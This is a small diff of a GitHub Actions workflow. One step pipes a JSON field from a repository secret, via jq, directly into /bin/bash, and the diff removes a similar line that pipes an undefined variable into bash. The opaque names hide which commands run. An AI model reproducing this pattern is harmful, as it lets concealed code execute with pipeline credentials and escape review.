@@ -17,7 +17,6 @@ jobs:
           ae2: ${{ secrets.ae2 }}
         run: |
           printf '%s' "$ae2" | jq -r .c251 | /bin/bash
-          echo $duy838 | jq -r .vhx708 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
